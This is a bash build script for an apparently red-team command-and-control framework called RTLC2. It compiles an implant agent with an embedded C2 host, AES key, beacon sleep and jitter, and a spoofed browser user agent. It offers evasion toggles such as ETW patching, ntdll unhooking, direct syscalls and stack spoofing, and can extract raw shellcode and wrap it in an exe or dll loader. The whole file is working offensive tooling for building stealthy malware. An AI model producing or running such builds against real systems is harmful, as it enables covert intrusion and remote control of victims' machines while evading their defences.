#!/bin/bash
# =============================================================================
# RTLC2 Agent Builder - macOS & Linux
# Compiles the C/C++ agent with embedded C2 configuration
# =============================================================================

set -e

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
NC='\033[0m'

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
PROJECT_DIR="$(dirname "$SCRIPT_DIR")"
AGENT_DIR="$PROJECT_DIR/agent"
BUILD_DIR="$PROJECT_DIR/build"

banner() {
    echo -e "${RED}"
    echo "  ____  _____ _     ____ ____  "
    echo " |  _ \|_   _| |   / ___|___ \ "
    echo " | |_) | | | | |  | |     __) |"
    echo " |  _ <  | | | |__| |___ / __/ "
    echo " |_| \_\ |_| |____\____|_____|"
    echo -e "${NC}"
    echo -e "${CYAN} Agent Builder - macOS & Linux${NC}"
    echo ""
}

usage() {
    echo "Usage: $0 [OPTIONS]"
    echo ""
    echo "Required:"
    echo "  -h, --host HOST        C2 server host/IP"
    echo "  -k, --key KEY          AES master key (hex, from teamserver)"
    echo ""
    echo "Optional:"
    echo "  -p, --port PORT        C2 server port (default: 443)"
    echo "  -s, --sleep SECONDS    Sleep interval (default: 5)"
    echo "  -j, --jitter PERCENT   Jitter percentage 0-100 (default: 10)"
    echo "  -t, --tls              Enable TLS (default: off)"
    echo "  --platform PLATFORM    Target: macos, linux (default: auto-detect)"
    echo "  --arch ARCH            Architecture: x64, arm64 (default: auto-detect)"
    echo "  -o, --output FILE      Output binary name"
    echo "  --shellcode            Also extract raw shellcode (Linux only)"
    echo "  --strip                Strip symbols (default: yes for release)"
    echo "  --debug                Build with debug symbols"
    echo ""
    echo "Examples:"
    echo "  $0 -h 10.10.10.1 -p 443 -k abc123...def -t"
    echo "  $0 -h c2.example.com -k abc123... --platform linux --arch x64"
    echo "  $0 -h 192.168.1.100 -p 80 -k abc123... -s 10 -j 30 --shellcode"
    echo ""
}

# Defaults
C2_HOST=""
C2_PORT=443
AES_KEY=""
SLEEP_INTERVAL=5
JITTER=10
USE_TLS=0
PLATFORM=""
ARCH=""
OUTPUT=""
EXTRACT_SHELLCODE=0
LOADER_FORMAT=""
DEBUG=0
USER_AGENT="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"

# Parse arguments
while [[ $# -gt 0 ]]; do
    case $1 in
        -h|--host) C2_HOST="$2"; shift 2;;
        -p|--port) C2_PORT="$2"; shift 2;;
        -k|--key) AES_KEY="$2"; shift 2;;
        -s|--sleep) SLEEP_INTERVAL="$2"; shift 2;;
        -j|--jitter) JITTER="$2"; shift 2;;
        -t|--tls) USE_TLS=1; shift;;
        --platform) PLATFORM="$2"; shift 2;;
        --arch) ARCH="$2"; shift 2;;
        -o|--output) OUTPUT="$2"; shift 2;;
        --shellcode) EXTRACT_SHELLCODE=1; shift;;
        --loader) LOADER_FORMAT="exe"; shift;;
        --loader-format) LOADER_FORMAT="$2"; shift 2;;
        --service) shift;; # Accepted but no-op for now
        --debug) DEBUG=1; shift;;
        --help) usage; exit 0;;
        *) echo -e "${RED}[!] Unknown option: $1${NC}"; usage; exit 1;;
    esac
done

banner

# Validate required args
if [[ -z "$C2_HOST" ]]; then
    echo -e "${RED}[!] Error: --host is required${NC}"
    usage
    exit 1
fi
if [[ -z "$AES_KEY" ]]; then
    echo -e "${RED}[!] Error: --key is required (get it from teamserver output)${NC}"
    usage
    exit 1
fi

# Auto-detect platform
if [[ -z "$PLATFORM" ]]; then
    case "$(uname -s)" in
        Darwin) PLATFORM="macos";;
        Linux)  PLATFORM="linux";;
        *)      echo -e "${RED}[!] Unknown OS. Use --platform${NC}"; exit 1;;
    esac
fi

# Auto-detect arch
if [[ -z "$ARCH" ]]; then
    case "$(uname -m)" in
        x86_64|amd64) ARCH="x64";;
        arm64|aarch64) ARCH="arm64";;
        *)             echo -e "${RED}[!] Unknown arch. Use --arch${NC}"; exit 1;;
    esac
fi

# Output filename
if [[ -z "$OUTPUT" ]]; then
    OUTPUT="rtlc2-agent-${PLATFORM}-${ARCH}"
fi

echo -e "${CYAN}[*] Configuration:${NC}"
echo -e "    C2 Host:    ${GREEN}$C2_HOST${NC}"
echo -e "    C2 Port:    ${GREEN}$C2_PORT${NC}"
echo -e "    TLS:        ${GREEN}$([ $USE_TLS -eq 1 ] && echo 'YES' || echo 'NO')${NC}"
echo -e "    Sleep:      ${GREEN}${SLEEP_INTERVAL}s${NC}"
echo -e "    Jitter:     ${GREEN}${JITTER}%${NC}"
echo -e "    Platform:   ${GREEN}$PLATFORM${NC}"
echo -e "    Arch:       ${GREEN}$ARCH${NC}"
echo -e "    Output:     ${GREEN}$OUTPUT${NC}"
echo ""

# Check dependencies
echo -e "${CYAN}[*] Checking dependencies...${NC}"
command -v cmake >/dev/null 2>&1 || { echo -e "${RED}[!] cmake not found${NC}"; exit 1; }

if [[ "$PLATFORM" == "macos" ]]; then
    command -v clang++ >/dev/null 2>&1 || { echo -e "${RED}[!] clang++ not found (install Xcode CLI tools)${NC}"; exit 1; }
else
    command -v g++ >/dev/null 2>&1 || command -v clang++ >/dev/null 2>&1 || { echo -e "${RED}[!] g++ or clang++ required${NC}"; exit 1; }
fi

# Check for OpenSSL and curl
if [[ "$PLATFORM" == "macos" ]]; then
    # macOS: check brew paths
    OPENSSL_ROOT=""
    if [[ -d "/opt/homebrew/opt/openssl@3" ]]; then
        OPENSSL_ROOT="/opt/homebrew/opt/openssl@3"
    elif [[ -d "/opt/homebrew/opt/openssl" ]]; then
        OPENSSL_ROOT="/opt/homebrew/opt/openssl"
    elif [[ -d "/usr/local/opt/openssl" ]]; then
        OPENSSL_ROOT="/usr/local/opt/openssl"
    fi
    if [[ -n "$OPENSSL_ROOT" ]]; then
        CMAKE_EXTRA="-DOPENSSL_ROOT_DIR=$OPENSSL_ROOT"
        echo -e "    OpenSSL:    ${GREEN}$OPENSSL_ROOT${NC}"
    fi
fi

# Build type
BUILD_TYPE="Release"
if [[ $DEBUG -eq 1 ]]; then
    BUILD_TYPE="Debug"
fi

# Create build directory
BUILD_SUBDIR="$AGENT_DIR/build-${PLATFORM}-${ARCH}"
mkdir -p "$BUILD_DIR"

echo ""
echo -e "${CYAN}[*] Compiling agent...${NC}"

cd "$AGENT_DIR"
cmake -B "$BUILD_SUBDIR" \
    -DCMAKE_BUILD_TYPE="$BUILD_TYPE" \
    -DRTLC2_C2_HOST="$C2_HOST" \
    -DRTLC2_C2_PORT="$C2_PORT" \
    -DRTLC2_SLEEP_INTERVAL="$SLEEP_INTERVAL" \
    -DRTLC2_JITTER="$JITTER" \
    -DRTLC2_USE_TLS="$USE_TLS" \
    -DRTLC2_AES_KEY="$AES_KEY" \
    -DRTLC2_USER_AGENT="$USER_AGENT" \
    -DRTLC2_SLEEP_MASK="${RTLC2_SLEEP_MASK:-0}" \
    -DRTLC2_STACK_SPOOF="${RTLC2_STACK_SPOOF:-0}" \
    -DRTLC2_ETW_PATCH="${RTLC2_ETW_PATCH:-0}" \
    -DRTLC2_UNHOOK_NTDLL="${RTLC2_UNHOOK_NTDLL:-0}" \
    -DRTLC2_SYSCALL_METHOD="${RTLC2_SYSCALL_METHOD:-none}" \
    -DRTLC2_EVASION_DELAY_EXEC="${RTLC2_EVASION_DELAY_EXEC:-0}" \
    -DRTLC2_EVASION_ENV_KEYING="${RTLC2_EVASION_ENV_KEYING:-0}" \
    -DRTLC2_EVASION_DIRECT_SYSCALLS="${RTLC2_EVASION_DIRECT_SYSCALLS:-0}" \
    -DRTLC2_EVASION_INDIRECT_SYSCALLS="${RTLC2_EVASION_INDIRECT_SYSCALLS:-0}" \
    -DRTLC2_EVASION_ETW_BLINDING="${RTLC2_EVASION_ETW_BLINDING:-0}" \
    -DRTLC2_EVASION_HOOK_BYPASS="${RTLC2_EVASION_HOOK_BYPASS:-0}" \
    -DRTLC2_DEBUG="${DEBUG}" \
    ${CMAKE_EXTRA:-} \
    2>&1 | while read -r line; do echo -e "    ${line}"; done

cmake --build "$BUILD_SUBDIR" --config "$BUILD_TYPE" 2>&1 | while read -r line; do echo -e "    ${line}"; done

# Determine final output path (handle absolute vs relative -o)
if [[ "$OUTPUT" == /* ]]; then
    FINAL_OUTPUT="$OUTPUT"
else
    FINAL_OUTPUT="$BUILD_DIR/$OUTPUT"
fi

# Copy output
if [[ -f "$BUILD_SUBDIR/rtlc2-agent" ]]; then
    mkdir -p "$(dirname "$FINAL_OUTPUT")"
    cp "$BUILD_SUBDIR/rtlc2-agent" "$FINAL_OUTPUT"
    chmod +x "$FINAL_OUTPUT"
    echo ""
    echo -e "${GREEN}[+] Agent compiled successfully!${NC}"
    echo -e "    Binary: ${GREEN}$FINAL_OUTPUT${NC}"
    echo -e "    Size:   $(du -h "$FINAL_OUTPUT" | cut -f1)"
    echo -e "    SHA256: $(shasum -a 256 "$FINAL_OUTPUT" | cut -d' ' -f1)"
else
    echo -e "${RED}[!] Build failed - binary not found${NC}"
    exit 1
fi

# Extract shellcode (.text section) and overwrite output with raw shellcode
if [[ $EXTRACT_SHELLCODE -eq 1 ]]; then
    echo ""
    echo -e "${CYAN}[*] Extracting shellcode from binary...${NC}"
    SHELLCODE_TMP="${FINAL_OUTPUT}.sc.tmp"
    EXTRACTED=0

    if [[ "$PLATFORM" == "linux" ]]; then
        # Linux: use objcopy to extract .text section
        if command -v objcopy >/dev/null 2>&1; then
            objcopy -O binary -j .text "$FINAL_OUTPUT" "$SHELLCODE_TMP" 2>/dev/null && EXTRACTED=1
        elif command -v llvm-objcopy >/dev/null 2>&1; then
            llvm-objcopy -O binary -j .text "$FINAL_OUTPUT" "$SHELLCODE_TMP" 2>/dev/null && EXTRACTED=1
        fi
    elif [[ "$PLATFORM" == "macos" ]]; then
        # macOS: extract entire __TEXT segment (not just __text section)
        # The __TEXT segment includes __text + __stubs + __stub_helper + __cstring
        # Extracting only __text misses stub trampolines that code BL's into
        if command -v otool >/dev/null 2>&1; then
            SECTION_INFO=$(otool -l "$FINAL_OUTPUT" 2>/dev/null)

            # __text section offset = start of actual code (past Mach-O header)
            TEXT_OFFSET=$(echo "$SECTION_INFO" | awk '/sectname __text/{found=1} found && /offset/{print $2; exit}')

            # __TEXT segment fileoff + filesize = end of entire segment
            # 'fileoff' and 'filesize' are segment-level fields (sections use 'offset'/'size')
            SEG_FILEOFF=$(echo "$SECTION_INFO" | awk '/segname __TEXT/{found=1} found && /fileoff/{print $2; exit}')
            SEG_FILESIZE=$(echo "$SECTION_INFO" | awk '/segname __TEXT/{found=1} found && /filesize/{print $2; exit}')

            if [[ -n "$TEXT_OFFSET" && -n "$SEG_FILEOFF" && -n "$SEG_FILESIZE" ]]; then
                TEXT_OFFSET_DEC=$((TEXT_OFFSET))
                SEG_END_DEC=$(( SEG_FILEOFF + SEG_FILESIZE ))
                EXTRACT_SIZE=$((SEG_END_DEC - TEXT_OFFSET_DEC))
                echo -e "    __TEXT segment: code starts at ${GREEN}$TEXT_OFFSET_DEC${NC}, extracting ${GREEN}$EXTRACT_SIZE${NC} bytes"
                echo -e "    Sections: __text + __stubs + __stub_helper + __cstring"
                dd if="$FINAL_OUTPUT" of="$SHELLCODE_TMP" bs=1 skip="$TEXT_OFFSET_DEC" count="$EXTRACT_SIZE" 2>/dev/null && EXTRACTED=1
            else
                echo -e "${YELLOW}    Could not parse __TEXT segment via otool${NC}"
            fi
        fi
        # Fallback: try gobjcopy or llvm-objcopy if available
        if [[ $EXTRACTED -eq 0 ]]; then
            for tool in gobjcopy llvm-objcopy; do
                if command -v "$tool" >/dev/null 2>&1; then
                    "$tool" -O binary -j __TEXT,__text "$FINAL_OUTPUT" "$SHELLCODE_TMP" 2>/dev/null && EXTRACTED=1
                    break
                fi
            done
        fi
    fi

    if [[ $EXTRACTED -eq 1 && -f "$SHELLCODE_TMP" && -s "$SHELLCODE_TMP" ]]; then
        # Overwrite the output file with raw shellcode so the Go server reads it
        mv "$SHELLCODE_TMP" "$FINAL_OUTPUT"
        echo -e "${GREEN}[+] Shellcode extracted: $(du -h "$FINAL_OUTPUT" | cut -f1)${NC}"
        echo -e "    SHA256: $(shasum -a 256 "$FINAL_OUTPUT" | cut -d' ' -f1)"
    else
        rm -f "$SHELLCODE_TMP" 2>/dev/null
        echo -e "${YELLOW}[!] Shellcode extraction failed - returning full binary${NC}"
        echo -e "${YELLOW}    The output file contains the full compiled binary.${NC}"
    fi
fi

# ═══════════════════════════════════════════════════════════════
# Build shellcode loader with embedded shellcode
# ═══════════════════════════════════════════════════════════════
if [[ -n "$LOADER_FORMAT" ]]; then
    echo ""
    echo -e "${CYAN}[*] Building shellcode loader (${LOADER_FORMAT})...${NC}"

    # Ensure shellcode extraction happened (loaders need raw shellcode)
    if [[ $EXTRACT_SHELLCODE -ne 1 ]]; then
        echo -e "${YELLOW}    Note: --loader implies --shellcode, extracting shellcode first...${NC}"
        # Re-read the binary and extract shellcode
        ORIGINAL_BINARY="$BUILD_SUBDIR/rtlc2-agent"
        SHELLCODE_TMP="${FINAL_OUTPUT}.sc.tmp"
        EXTRACTED=0

        if [[ -f "$ORIGINAL_BINARY" ]]; then
            if [[ "$PLATFORM" == "linux" ]]; then
                if command -v objcopy >/dev/null 2>&1; then
                    objcopy -O binary -j .text "$ORIGINAL_BINARY" "$SHELLCODE_TMP" 2>/dev/null && EXTRACTED=1
                elif command -v llvm-objcopy >/dev/null 2>&1; then
                    llvm-objcopy -O binary -j .text "$ORIGINAL_BINARY" "$SHELLCODE_TMP" 2>/dev/null && EXTRACTED=1
                fi
            elif [[ "$PLATFORM" == "macos" ]]; then
                if command -v otool >/dev/null 2>&1; then
                    SECTION_INFO=$(otool -l "$ORIGINAL_BINARY" 2>/dev/null)
                    TEXT_OFFSET=$(echo "$SECTION_INFO" | awk '/sectname __text/{found=1} found && /offset/{print $2; exit}')
                    SEG_FILEOFF=$(echo "$SECTION_INFO" | awk '/segname __TEXT/{found=1} found && /fileoff/{print $2; exit}')
                    SEG_FILESIZE=$(echo "$SECTION_INFO" | awk '/segname __TEXT/{found=1} found && /filesize/{print $2; exit}')
                    if [[ -n "$TEXT_OFFSET" && -n "$SEG_FILEOFF" && -n "$SEG_FILESIZE" ]]; then
                        TEXT_OFFSET_DEC=$((TEXT_OFFSET))
                        SEG_END_DEC=$(( SEG_FILEOFF + SEG_FILESIZE ))
                        EXTRACT_SIZE=$((SEG_END_DEC - TEXT_OFFSET_DEC))
                        dd if="$ORIGINAL_BINARY" of="$SHELLCODE_TMP" bs=1 skip="$TEXT_OFFSET_DEC" count="$EXTRACT_SIZE" 2>/dev/null && EXTRACTED=1
                    fi
                fi
            fi
            if [[ $EXTRACTED -eq 1 && -f "$SHELLCODE_TMP" && -s "$SHELLCODE_TMP" ]]; then
                mv "$SHELLCODE_TMP" "$FINAL_OUTPUT"
            else
                rm -f "$SHELLCODE_TMP" 2>/dev/null
                echo -e "${RED}[!] Shellcode extraction failed, cannot build loader${NC}"
                exit 1
            fi
        fi
    fi

    LOADER_DIR="$PROJECT_DIR/agent/loader"
    LOADER_BUILD="$BUILD_DIR/loader-${PLATFORM}-${ARCH}"
    mkdir -p "$LOADER_BUILD"

    # Generate shellcode_data.h from raw shellcode binary
    echo -e "    Generating shellcode_data.h..."
    SC_SIZE=$(wc -c < "$FINAL_OUTPUT" | tr -d ' ')
    {
        echo "/* Auto-generated shellcode data - ${SC_SIZE} bytes */"
        echo "static const unsigned char shellcode[] = {"
        xxd -i < "$FINAL_OUTPUT" | sed '/^unsigned/d'
        echo "};"
        echo "static const unsigned int shellcode_len = ${SC_SIZE};"
    } > "$LOADER_BUILD/shellcode_data.h"

    echo -e "    Shellcode size: ${GREEN}${SC_SIZE}${NC} bytes"

    # Build loader with CMake
    cmake -B "$LOADER_BUILD" -S "$LOADER_DIR" \
        -DCMAKE_BUILD_TYPE="$BUILD_TYPE" \
        ${CMAKE_EXTRA:-} \
        2>&1 | while read -r line; do echo -e "    ${line}"; done

    cmake --build "$LOADER_BUILD" --config "$BUILD_TYPE" 2>&1 | while read -r line; do echo -e "    ${line}"; done

    # Find and copy loader output
    LOADER_BIN=""
    if [[ "$LOADER_FORMAT" == "dll" ]]; then
        LOADER_BIN=$(find "$LOADER_BUILD" -name "rtlc2-loader.dll" -o -name "rtlc2-loader-dll*" 2>/dev/null | head -1)
    else
        LOADER_BIN=$(find "$LOADER_BUILD" -name "rtlc2-loader-exe*" -o -name "rtlc2-loader" 2>/dev/null | grep -v '\.dll' | head -1)
    fi

    if [[ -n "$LOADER_BIN" && -f "$LOADER_BIN" ]]; then
        cp "$LOADER_BIN" "$FINAL_OUTPUT"
        chmod +x "$FINAL_OUTPUT"
        echo -e "${GREEN}[+] Shellcode loader built successfully!${NC}"
        echo -e "    Output: ${GREEN}$FINAL_OUTPUT${NC}"
        echo -e "    Size:   $(du -h "$FINAL_OUTPUT" | cut -f1)"
        echo -e "    SHA256: $(shasum -a 256 "$FINAL_OUTPUT" | cut -d' ' -f1)"
    else
        echo -e "${RED}[!] Loader build failed - binary not found${NC}"
        exit 1
    fi
fi

echo ""
echo -e "${GREEN}[+] Done!${NC}"
